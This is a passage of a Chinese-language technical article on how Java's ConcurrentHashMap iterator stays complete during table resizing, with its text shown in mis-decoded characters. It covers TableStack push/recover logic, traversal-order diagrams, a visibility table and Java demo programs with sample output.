<h3 data-id="heading-12">Case 6ï¼šæ‰©å®¹æœŸé—´çš„è¿­ä»£ â€”â€” ä¿è¯éå†å®Œæ•´æ€§ï¼ˆæ·±å…¥åˆ†æï¼‰</h3>
<h4 data-id="heading-13">æ ¸å¿ƒæ€æƒ³</h4>
<p>æ‰©å®¹æ—¶è¿­ä»£å™¨éœ€è¦<strong>åŒæ—¶éå†æ—§è¡¨å’Œæ–°è¡¨</strong>ï¼Œä¸”æ”¯æŒ<strong>é€’å½’æ‰©å®¹</strong>ï¼ˆæ‰©å®¹è¿‡ç¨‹ä¸­å†æ¬¡æ‰©å®¹ï¼‰ã€‚é€šè¿‡ <code>stack</code> ä¿å­˜æ—§è¡¨çŠ¶æ€ï¼Œéå†å®Œæ–°è¡¨åæ¢å¤æ—§è¡¨ç»§ç»­éå†ã€‚</p>
<h4 data-id="heading-14">JDK æºç æ³¨é‡Šï¼ˆåŸæ–‡ç¿»è¯‘ï¼‰</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/*
 * Traversalï¼ˆéå†ï¼‰å¿…é¡»å¤„ç†ä»¥ä¸‹æƒ…å†µï¼š
 * 1. éå†å¼€å§‹åçš„è¡¨æ‰©å®¹
 * 2. éå†è¿‡ç¨‹ä¸­é‡åˆ° ForwardingNodeï¼ˆè¡¨ç¤ºè¯¥æ¡¶å·²è¿ç§»åˆ°æ–°è¡¨ï¼‰
 *
 * æ ¸å¿ƒç­–ç•¥ï¼š
 * - å½“é‡åˆ° ForwardingNode æ—¶ï¼Œåˆ‡æ¢åˆ°æ–°è¡¨ç»§ç»­éå†
 * - ä½¿ç”¨ TableStack ä¿å­˜æ—§è¡¨çš„éå†çŠ¶æ€
 * - éå†å®Œæ–°è¡¨å¯¹åº”åŒºåŸŸåï¼Œæ¢å¤æ—§è¡¨çŠ¶æ€ç»§ç»­
 * - æ”¯æŒåµŒå¥—æ‰©å®¹ï¼ˆæ‰©å®¹ä¸­å†æ‰©å®¹ï¼‰
 *
 * éå†é¡ºåºï¼š
 * - æ­£å¸¸æƒ…å†µï¼šæŒ‰ baseIndex é¡ºåºéå† [0, 1, 2, ..., n-1]
 * - æ‰©å®¹æ—¶ï¼šæ·±åº¦ä¼˜å…ˆï¼Œå…ˆéå†æ–°è¡¨ï¼Œå†å›åˆ°æ—§è¡¨
 */</span>
</code></pre>
<h4 data-id="heading-15">TableStack ç»“æ„</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * ç”¨äºä¿å­˜/æ¢å¤éå†çŠ¶æ€çš„æ ˆç»“æ„
 * å½“é‡åˆ° ForwardingNode æ—¶ pushï¼Œéå†å®Œæ–°è¡¨å pop æ¢å¤
 */</span>
<span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TableStack</span>&lt;K,V&gt; {
    <span class="hljs-type">int</span> length;             <span class="hljs-comment">// æ—§è¡¨é•¿åº¦</span>
    <span class="hljs-type">int</span> index;              <span class="hljs-comment">// æ—§è¡¨ä¸­ä¸‹ä¸€ä¸ªè¦éå†çš„ç´¢å¼•</span>
    Node&lt;K,V&gt;[] tab;        <span class="hljs-comment">// æ—§è¡¨å¼•ç”¨</span>
    TableStack&lt;K,V&gt; next;   <span class="hljs-comment">// é“¾è¡¨ç»“æ„ï¼Œæ”¯æŒåµŒå¥—æ‰©å®¹</span>
}

<span class="hljs-comment">// Traverser ä¸­çš„å­—æ®µ</span>
TableStack&lt;K,V&gt; stack;      <span class="hljs-comment">// çŠ¶æ€æ ˆ</span>
TableStack&lt;K,V&gt; spare;      <span class="hljs-comment">// ã€ä¼˜åŒ–ã€‘å¯¹è±¡æ± ï¼Œé¿å…é¢‘ç¹ new</span>
</code></pre>
<h4 data-id="heading-16">pushStateï¼šä¿å­˜æ—§è¡¨çŠ¶æ€</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * é‡åˆ° ForwardingNode æ—¶è°ƒç”¨ï¼Œä¿å­˜å½“å‰éå†çŠ¶æ€
 */</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pushState</span><span class="hljs-params">(Node&lt;K,V&gt;[] t, <span class="hljs-type">int</span> i, <span class="hljs-type">int</span> n)</span> {
    TableStack&lt;K,V&gt; s = spare;  <span class="hljs-comment">// ã€ä¼˜åŒ–ã€‘ä¼˜å…ˆå¤ç”¨ spare å¯¹è±¡</span>
    <span class="hljs-keyword">if</span> (s != <span class="hljs-literal">null</span>)
        spare = s.next;         <span class="hljs-comment">// spare æ˜¯å•é“¾è¡¨ï¼Œå–å¤´èŠ‚ç‚¹</span>
    <span class="hljs-keyword">else</span>
        s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TableStack</span>&lt;K,V&gt;();  <span class="hljs-comment">// spare ä¸ºç©ºæ‰ new</span>
    s.tab = t;                  <span class="hljs-comment">// ä¿å­˜æ—§è¡¨å¼•ç”¨</span>
    s.length = n;               <span class="hljs-comment">// ä¿å­˜æ—§è¡¨é•¿åº¦</span>
    s.index = i;                <span class="hljs-comment">// ä¿å­˜æ—§è¡¨å½“å‰ç´¢å¼•</span>
    s.next = stack;             <span class="hljs-comment">// å‹æ ˆ</span>
    stack = s;
}
</code></pre>
<h4 data-id="heading-17">recoverStateï¼šæ¢å¤æ—§è¡¨çŠ¶æ€</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * æ–°è¡¨éå†å®Œæˆåï¼Œæ¢å¤æ—§è¡¨çŠ¶æ€ç»§ç»­éå†
 * <span class="hljs-doctag">@param</span> n å½“å‰è¡¨é•¿åº¦ï¼Œç”¨äºåˆ¤æ–­æ˜¯å¦éœ€è¦æ¢å¤
 */</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">recoverState</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> {
    TableStack&lt;K,V&gt; s; <span class="hljs-type">int</span> len;
    <span class="hljs-comment">// å¾ªç¯å¤„ç†ï¼šå¯èƒ½æœ‰å¤šå±‚åµŒå¥—æ‰©å®¹</span>
    <span class="hljs-keyword">while</span> ((s = stack) != <span class="hljs-literal">null</span> &amp;&amp; (index += (len = s.length)) &gt;= n) {
        n = len;
        index = s.index;        <span class="hljs-comment">// æ¢å¤æ—§è¡¨ç´¢å¼•</span>
        tab = s.tab;            <span class="hljs-comment">// æ¢å¤æ—§è¡¨å¼•ç”¨</span>
        s.tab = <span class="hljs-literal">null</span>;           <span class="hljs-comment">// help GC</span>
        TableStack&lt;K,V&gt; next = s.next;
        s.next = spare;         <span class="hljs-comment">// ã€ä¼˜åŒ–ã€‘ç”¨å®Œçš„å¯¹è±¡æ”¾å› spare æ± </span>
        stack = next;           <span class="hljs-comment">// å¼¹æ ˆ</span>
        spare = s;
    }
    <span class="hljs-comment">// è°ƒæ•´ index åˆ°ä¸‹ä¸€ä¸ªè¦éå†çš„ä½ç½®</span>
    <span class="hljs-keyword">if</span> (s == <span class="hljs-literal">null</span> &amp;&amp; (index += baseSize) &gt;= n)
        index = ++baseIndex;
}
</code></pre>
<h4 data-id="heading-18">spare å¯¹è±¡æ± ä¼˜åŒ–</h4>
<pre><code class="hljs language-markdown" lang="markdown">spare è®¾è®¡ç›®çš„ï¼šé¿å…æ‰©å®¹éå†æ—¶é¢‘ç¹åˆ›å»º TableStack å¯¹è±¡

å·¥ä½œæµç¨‹ï¼š
<span class="hljs-bullet">1.</span> pushState æ—¶ï¼šä¼˜å…ˆä» spare å–å¯¹è±¡ï¼Œæ²¡æœ‰æ‰ new
<span class="hljs-bullet">2.</span> recoverState æ—¶ï¼šç”¨å®Œçš„å¯¹è±¡æ”¾å› spare

æ•ˆæœï¼š
<span class="hljs-bullet">-</span> å•æ¬¡æ‰©å®¹ï¼šæœ€å¤š new 1 ä¸ª TableStack
<span class="hljs-bullet">-</span> åµŒå¥—æ‰©å®¹ï¼šå¤ç”¨å·²æœ‰å¯¹è±¡ï¼Œå‡å°‘ GC å‹åŠ›
</code></pre>
<h4 data-id="heading-19">éå†é¡ºåºå˜åŒ–å›¾è§£</h4>
<pre><code class="hljs language-ini" lang="ini">ã€æ­£å¸¸éå†ã€‘æŒ‰ baseIndex é¡ºåº
tab<span class="hljs-section">[16]</span>: <span class="hljs-section">[0]</span> -&gt; <span class="hljs-section">[1]</span> -&gt; <span class="hljs-section">[2]</span> -&gt; ... -&gt; <span class="hljs-section">[15]</span>
         â†‘
      baseIndex++

ã€æ‰©å®¹æ—¶éå†ã€‘æ·±åº¦ä¼˜å…ˆï¼Œå…ˆæ–°è¡¨åæ—§è¡¨

å‡è®¾åœ¨éå† tab<span class="hljs-section">[16]</span> çš„ <span class="hljs-attr">index</span>=<span class="hljs-number">5</span> æ—¶è§¦å‘æ‰©å®¹ï¼š

æ—§è¡¨ tab<span class="hljs-section">[16]</span>:  <span class="hljs-section">[0]</span> <span class="hljs-section">[1]</span> <span class="hljs-section">[2]</span> <span class="hljs-section">[3]</span> <span class="hljs-section">[4]</span> <span class="hljs-section">[5:FWD]</span> <span class="hljs-section">[6]</span> ... <span class="hljs-section">[15]</span>
                                    â†“ pushState
æ–°è¡¨ tab<span class="hljs-section">[32]</span>:  éå† <span class="hljs-attr">index</span>=<span class="hljs-number">5</span> å’Œ index=<span class="hljs-number">5</span>+<span class="hljs-number">16</span>=<span class="hljs-number">21</span> çš„æ¡¶
                                    â†“ recoverState
æ—§è¡¨ tab<span class="hljs-section">[16]</span>:  ç»§ç»­ä» <span class="hljs-section">[6]</span> éå† ... <span class="hljs-section">[15]</span>

éå†é¡ºåºï¼š<span class="hljs-section">[0,1,2,3,4]</span> -&gt; <span class="hljs-section">[5çš„æ–°è¡¨ä½ç½®,21çš„æ–°è¡¨ä½ç½®]</span> -&gt; <span class="hljs-section">[6,7,...,15]</span>
</code></pre>
<h4 data-id="heading-20">æ‰©å®¹éå†çš„å®Œæ•´æµç¨‹</h4>
<pre><code class="hljs language-ini" lang="ini">1. è¿­ä»£å™¨åœ¨æ—§è¡¨ <span class="hljs-attr">index</span>=i é‡åˆ° ForwardingNode
2. pushState(oldTab, i, oldLen) - ä¿å­˜æ—§è¡¨çŠ¶æ€åˆ° stack
<span class="hljs-attr">3. tab</span> = ForwardingNode.nextTable - åˆ‡æ¢åˆ°æ–°è¡¨
4. åœ¨æ–°è¡¨ä¸­éå† <span class="hljs-attr">index</span>=i å’Œ index=i+oldLen ä¸¤ä¸ªä½ç½®
   (å› ä¸ºæ‰©å®¹åï¼ŒåŸæ¡¶çš„å…ƒç´ ä¼šåˆ†æ•£åˆ°è¿™ä¸¤ä¸ªä½ç½®)
5. æ–°è¡¨å¯¹åº”ä½ç½®éå†å®Œï¼ŒrecoverState æ¢å¤æ—§è¡¨çŠ¶æ€
6. ç»§ç»­æ—§è¡¨ <span class="hljs-attr">index</span>=i+<span class="hljs-number">1</span> çš„éå†
7. å¦‚æœæ–°è¡¨ä¸­åˆé‡åˆ° ForwardingNodeï¼ˆåµŒå¥—æ‰©å®¹ï¼‰ï¼Œé‡å¤ 2-6
</code></pre>
<h2 data-id="heading-21">æ•°æ®å¯è§æ€§æ€»ç»“è¡¨</h2>















































<table><thead><tr><th>åœºæ™¯</th><th>æ“ä½œä½ç½®</th><th>æ“ä½œç±»å‹</th><th>è¿­ä»£å™¨å¯è§æ€§</th></tr></thead><tbody><tr><td>Case 1</td><td>æœªéå†çš„æ¡¶</td><td>åˆ é™¤</td><td>ä¸å¯è§ï¼ˆæ•°æ®ä¸¢å¤±ï¼‰</td></tr><tr><td>Case 2</td><td>å·²éå†çš„æ¡¶</td><td>åˆ é™¤</td><td>å·²è¿”å›ï¼Œä¸å½±å“</td></tr><tr><td>Case 3</td><td>æœªéå†çš„æ¡¶</td><td>æ–°å¢</td><td>å¯èƒ½å¯è§</td></tr><tr><td>Case 4</td><td>å·²éå†çš„æ¡¶</td><td>æ–°å¢</td><td>ä¸å¯è§</td></tr><tr><td>Case 5</td><td>å½“å‰é“¾è¡¨åç»§</td><td>ä¿®æ”¹</td><td>å¯èƒ½å¯è§</td></tr><tr><td>Case 6</td><td>æ‰©å®¹</td><td>ç»“æ„å˜åŒ–</td><td>ä¿è¯å®Œæ•´éå†</td></tr></tbody></table>
<h2 data-id="heading-22">å®Œæ•´ç¤ºä¾‹</h2>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.Iterator;
<span class="hljs-keyword">import</span> java.util.Map;
<span class="hljs-keyword">import</span> java.util.concurrent.ConcurrentHashMap;
<span class="hljs-keyword">import</span> java.util.concurrent.CountDownLatch;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConcurrentHashMapWeakConsistencyDemo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-comment">// Case 1: åˆ é™¤æœªéå†çš„å…ƒç´  - æ•°æ®ä¸¢å¤±</span>
        System.out.println(<span class="hljs-string">"=== Case 1: åˆ é™¤æœªéå†çš„å…ƒç´  ==="</span>);
        testDeleteUnvisited();

        <span class="hljs-comment">// Case 2: æ–°å¢åˆ°æœªéå†çš„æ¡¶ - å¯èƒ½å¯è§</span>
        System.out.println(<span class="hljs-string">"\n=== Case 2: æ–°å¢åˆ°æœªéå†çš„æ¡¶ ==="</span>);
        testAddToUnvisited();

        <span class="hljs-comment">// Case 3: æ–°å¢åˆ°å·²éå†çš„æ¡¶ - ä¸å¯è§</span>
        System.out.println(<span class="hljs-string">"\n=== Case 3: æ–°å¢åˆ°å·²éå†çš„æ¡¶ ==="</span>);
        testAddToVisited();
    }

    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testDeleteUnvisited</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
        ConcurrentHashMap&lt;Integer, String&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();
        <span class="hljs-comment">// æ’å…¥å¤šä¸ªå…ƒç´ ï¼Œç¡®ä¿åˆ†å¸ƒåœ¨ä¸åŒæ¡¶</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {
            map.put(i, <span class="hljs-string">"value-"</span> + i);
        }

        <span class="hljs-type">CountDownLatch</span> <span class="hljs-variable">iteratorStarted</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CountDownLatch</span>(<span class="hljs-number">1</span>);
        <span class="hljs-type">CountDownLatch</span> <span class="hljs-variable">deleteCompleted</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CountDownLatch</span>(<span class="hljs-number">1</span>);

        <span class="hljs-type">int</span>[] iteratedCount = {<span class="hljs-number">0</span>};
        <span class="hljs-type">int</span>[] foundKey50 = {<span class="hljs-number">0</span>};

        <span class="hljs-type">Thread</span> <span class="hljs-variable">iteratorThread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            Iterator&lt;Map.Entry&lt;Integer, String&gt;&gt; it = map.entrySet().iterator();
            iteratorStarted.countDown();
            <span class="hljs-keyword">try</span> {
                deleteCompleted.await(); <span class="hljs-comment">// ç­‰å¾…åˆ é™¤å®Œæˆ</span>
            } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
            <span class="hljs-keyword">while</span> (it.hasNext()) {
                Map.Entry&lt;Integer, String&gt; entry = it.next();
                iteratedCount[<span class="hljs-number">0</span>]++;
                <span class="hljs-keyword">if</span> (entry.getKey() == <span class="hljs-number">50</span>) {
                    foundKey50[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;
                }
            }
        });

        <span class="hljs-type">Thread</span> <span class="hljs-variable">deleteThread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">try</span> {
                iteratorStarted.await(); <span class="hljs-comment">// ç­‰å¾…è¿­ä»£å™¨åˆ›å»º</span>
            } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
            map.remove(<span class="hljs-number">50</span>); <span class="hljs-comment">// åˆ é™¤ key=50</span>
            deleteCompleted.countDown();
        });

        iteratorThread.start();
        deleteThread.start();
        iteratorThread.join();
        deleteThread.join();

        System.out.println(<span class="hljs-string">"åŸå§‹å¤§å°: 100, è¿­ä»£æ•°é‡: "</span> + iteratedCount[<span class="hljs-number">0</span>]);
        System.out.println(<span class="hljs-string">"key=50 æ˜¯å¦è¢«è¿­ä»£åˆ°: "</span> + (foundKey50[<span class="hljs-number">0</span>] == <span class="hljs-number">1</span> ? <span class="hljs-string">"æ˜¯"</span> : <span class="hljs-string">"å¦ï¼ˆæ•°æ®ä¸¢å¤±ï¼‰"</span>));
    }

    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testAddToUnvisited</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
        ConcurrentHashMap&lt;Integer, String&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
            map.put(i, <span class="hljs-string">"value-"</span> + i);
        }

        <span class="hljs-type">int</span>[] iteratedCount = {<span class="hljs-number">0</span>};
        <span class="hljs-type">int</span>[] foundKey999 = {<span class="hljs-number">0</span>};

        <span class="hljs-type">Thread</span> <span class="hljs-variable">iteratorThread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            Iterator&lt;Map.Entry&lt;Integer, String&gt;&gt; it = map.entrySet().iterator();
            <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
            <span class="hljs-keyword">while</span> (it.hasNext()) {
                Map.Entry&lt;Integer, String&gt; entry = it.next();
                iteratedCount[<span class="hljs-number">0</span>]++;
                <span class="hljs-keyword">if</span> (entry.getKey() == <span class="hljs-number">999</span>) {
                    foundKey999[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;
                }
                <span class="hljs-comment">// ç¬¬ä¸€æ¬¡è¿­ä»£åï¼Œè®©å¦ä¸€ä¸ªçº¿ç¨‹æ’å…¥</span>
                <span class="hljs-keyword">if</span> (count == <span class="hljs-number">0</span>) {
                    <span class="hljs-keyword">try</span> { Thread.sleep(<span class="hljs-number">50</span>); } <span class="hljs-keyword">catch</span> (InterruptedException ignored) {}
                }
                count++;
            }
        });

        <span class="hljs-type">Thread</span> <span class="hljs-variable">addThread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">try</span> { Thread.sleep(<span class="hljs-number">10</span>); } <span class="hljs-keyword">catch</span> (InterruptedException ignored) {}
            map.put(<span class="hljs-number">999</span>, <span class="hljs-string">"new-value"</span>); <span class="hljs-comment">// æ’å…¥æ–°å…ƒç´ </span>
        });

        iteratorThread.start();
        addThread.start();
        iteratorThread.join();
        addThread.join();

        System.out.println(<span class="hljs-string">"åŸå§‹å¤§å°: 10, æœ€ç»ˆmapå¤§å°: "</span> + map.size() + <span class="hljs-string">", è¿­ä»£æ•°é‡: "</span> + iteratedCount[<span class="hljs-number">0</span>]);
        System.out.println(<span class="hljs-string">"key=999 æ˜¯å¦è¢«è¿­ä»£åˆ°: "</span> + (foundKey999[<span class="hljs-number">0</span>] == <span class="hljs-number">1</span> ? <span class="hljs-string">"æ˜¯ï¼ˆæ–°æ•°æ®å¯è§ï¼‰"</span> : <span class="hljs-string">"å¦"</span>));
    }

    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testAddToVisited</span><span class="hljs-params">()</span> {
        ConcurrentHashMap&lt;Integer, String&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();
        map.put(<span class="hljs-number">1</span>, <span class="hljs-string">"one"</span>);

        Iterator&lt;Map.Entry&lt;Integer, String&gt;&gt; it = map.entrySet().iterator();

        <span class="hljs-comment">// å…ˆéå†ç¬¬ä¸€ä¸ªå…ƒç´ </span>
        <span class="hljs-keyword">if</span> (it.hasNext()) {
            System.out.println(<span class="hljs-string">"éå†åˆ°: "</span> + it.next());
        }

        <span class="hljs-comment">// åœ¨éå†åæ’å…¥åˆ°åŒä¸€ä¸ªæ¡¶ï¼ˆé€šè¿‡ hash å†²çªï¼‰</span>
        map.put(<span class="hljs-number">1</span> + <span class="hljs-number">16</span>, <span class="hljs-string">"new-after-visit"</span>); <span class="hljs-comment">// å‡è®¾åˆå§‹å®¹é‡16ï¼Œä¼šè½å…¥ç›¸é‚»æ¡¶</span>
        map.put(<span class="hljs-number">1</span>, <span class="hljs-string">"updated-one"</span>); <span class="hljs-comment">// æ›´æ–°å·²éå†çš„ key</span>

        <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        <span class="hljs-keyword">while</span> (it.hasNext()) {
            System.out.println(<span class="hljs-string">"ç»§ç»­éå†åˆ°: "</span> + it.next());
            count++;
        }

        System.out.println(<span class="hljs-string">"åç»­éå†æ•°é‡: "</span> + count);
        System.out.println(<span class="hljs-string">"è¯´æ˜: å·²éå†æ¡¶çš„ä¿®æ”¹é€šå¸¸ä¸ä¼šè¢«çœ‹åˆ°"</span>);
    }
}
</code></pre>
<p><strong>è¿è¡Œè¾“å‡ºç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">=== Case 1: åˆ é™¤æœªéå†çš„å…ƒç´  ===
åŸå§‹å¤§å°: 100, è¿­ä»£æ•°é‡: 99
<span class="hljs-attr">key</span>=<span class="hljs-number">50</span> æ˜¯å¦è¢«è¿­ä»£åˆ°: å¦ï¼ˆæ•°æ®ä¸¢å¤±ï¼‰

=== Case 2: æ–°å¢åˆ°æœªéå†çš„æ¡¶ ===
åŸå§‹å¤§å°: 10, æœ€ç»ˆmapå¤§å°: 11, è¿­ä»£æ•°é‡: 11
<span class="hljs-attr">key</span>=<span class="hljs-number">999</span> æ˜¯å¦è¢«è¿­ä»£åˆ°: æ˜¯ï¼ˆæ–°æ•°æ®å¯è§ï¼‰

=== Case 3: æ–°å¢åˆ°å·²éå†çš„æ¡¶ ===
éå†åˆ°: <span class="hljs-attr">1</span>=<span class="hljs-literal">on</span>e
ç»§ç»­éå†åˆ°: <span class="hljs-attr">17</span>=new-after-visit
åç»­éå†æ•°é‡: 1
è¯´æ˜: å·²éå†æ¡¶çš„ä¿®æ”¹é€šå¸¸ä¸ä¼šè¢«çœ‹åˆ°
</code></pre>
<h3 data-id="heading-23">æ‰©å®¹éå†é¡ºåºæ¼”ç¤º</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.lang.reflect.Field;
<span class="hljs-keyword">import</span> java.util.ArrayList;
<span class="hljs-keyword">import</span> java.util.Iterator;
<span class="hljs-keyword">import</span> java.util.List;
<span class="hljs-keyword">import</span> java.util.concurrent.ConcurrentHashMap;

<span class="hljs-comment">/**
 * æ¼”ç¤º ConcurrentHashMap æ‰©å®¹æ—¶è¿­ä»£å™¨çš„éå†é¡ºåºå˜åŒ–
 *
 * æ ¸å¿ƒè§‚å¯Ÿç‚¹ï¼š
 * 1. æ­£å¸¸éå†ï¼šæŒ‰æ¡¶ä½é¡ºåº [0,1,2,...,n-1]
 * 2. æ‰©å®¹éå†ï¼šæ·±åº¦ä¼˜å…ˆï¼Œé‡åˆ° ForwardingNode å…ˆéå†æ–°è¡¨
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ResizeTraversalOrderDemo</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        System.out.println(<span class="hljs-string">"=== 1. æ­£å¸¸éå†é¡ºåº ==="</span>);
        normalTraversalOrder();

        System.out.println(<span class="hljs-string">"\n=== 2. æ‰©å®¹æ—¶éå†é¡ºåºï¼ˆæ¨¡æ‹Ÿï¼‰ ==="</span>);
        explainResizeTraversal();

        System.out.println(<span class="hljs-string">"\n=== 3. éªŒè¯æ‰©å®¹ä¸ä¸¢æ•°æ® ==="</span>);
        verifyResizeCompleteness();
    }

    <span class="hljs-comment">/**
     * æ¼”ç¤ºæ­£å¸¸æƒ…å†µä¸‹çš„éå†é¡ºåº
     */</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">normalTraversalOrder</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        ConcurrentHashMap&lt;Integer, String&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;(<span class="hljs-number">16</span>);

        <span class="hljs-comment">// ç²¾å¿ƒé€‰æ‹© keyï¼Œä½¿å…¶åˆ†å¸ƒåœ¨ä¸åŒæ¡¶ä½</span>
        <span class="hljs-comment">// hash &amp; (n-1) å†³å®šæ¡¶ä½ï¼Œn=16 æ—¶ï¼Œæ¡¶ä½ = hash &amp; 15</span>
        <span class="hljs-type">int</span>[] keys = {<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">16</span>, <span class="hljs-number">17</span>, <span class="hljs-number">32</span>}; <span class="hljs-comment">// æ¡¶ä½åˆ†åˆ«æ˜¯ 0,1,2,0,1,0</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> key : keys) {
            map.put(key, <span class="hljs-string">"v"</span> + key);
        }

        System.out.println(<span class="hljs-string">"Map å†…å®¹: "</span> + map);
        System.out.println(<span class="hljs-string">"éå†é¡ºåºï¼ˆæŒ‰æ¡¶ä½ï¼‰:"</span>);

        List&lt;Integer&gt; order = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        <span class="hljs-keyword">for</span> (Integer key : map.keySet()) {
            order.add(key);
            <span class="hljs-type">int</span> <span class="hljs-variable">bucket</span> <span class="hljs-operator">=</span> key &amp; <span class="hljs-number">15</span>; <span class="hljs-comment">// å‡è®¾å®¹é‡16</span>
            System.out.println(<span class="hljs-string">"  key="</span> + key + <span class="hljs-string">" (æ¡¶ä½â‰ˆ"</span> + (key % <span class="hljs-number">16</span>) + <span class="hljs-string">")"</span>);
        }
    }

    <span class="hljs-comment">/**
     * å›¾è§£æ‰©å®¹æ—¶çš„éå†é€»è¾‘
     */</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">explainResizeTraversal</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"""
            æ‰©å®¹éå†åŸç†å›¾è§£ï¼š

            ã€åœºæ™¯ã€‘å®¹é‡ 16 æ‰©å®¹åˆ° 32ï¼Œè¿­ä»£å™¨æ­£åœ¨éå†

            æ—§è¡¨[16]:  [0] [1] [2] [3] [4] [5:FWD] [6] [7] ... [15]
                        â†“   â†“   â†“   â†“   â†“     â†“
            å·²éå† â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â”‚
                                              â”‚ é‡åˆ° ForwardingNode
                                              â†“
            æ–°è¡¨[32]:                    [5]      [21]  (5+16=21)
                                          â†“        â†“
                                       éå†æ–°è¡¨å¯¹åº”ä½ç½®
                                              â”‚
                                              â†“ recoverState
            æ—§è¡¨[16]:                              [6] [7] ... [15]
                                                   â†“
                                               ç»§ç»­æ—§è¡¨éå†

            ã€éå†é¡ºåºã€‘
            æ—§è¡¨: 0 â†’ 1 â†’ 2 â†’ 3 â†’ 4 â†’ (é‡åˆ°FWD)
            æ–°è¡¨:                      â†’ 5 â†’ 21
            æ—§è¡¨:                               â†’ 6 â†’ 7 â†’ ... â†’ 15

            ã€å…³é”®ç‚¹ã€‘
            1. index è·³è·ƒï¼šæ–°è¡¨ä¸­éå† i å’Œ i+oldLen ä¸¤ä¸ªä½ç½®
            2. æ·±åº¦ä¼˜å…ˆï¼šå…ˆå®Œæˆæ–°è¡¨ï¼Œå†å›æ—§è¡¨
            3. ä¸é‡ä¸æ¼ï¼šé€šè¿‡ stack ä¿è¯çŠ¶æ€æ­£ç¡®æ¢å¤
            """</span>);
    }

    <span class="hljs-comment">/**
     * éªŒè¯æ‰©å®¹è¿‡ç¨‹ä¸­éå†çš„å®Œæ•´æ€§
     */</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">verifyResizeCompleteness</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-comment">// ä½¿ç”¨è¾ƒå°åˆå§‹å®¹é‡ï¼Œå®¹æ˜“è§¦å‘æ‰©å®¹</span>
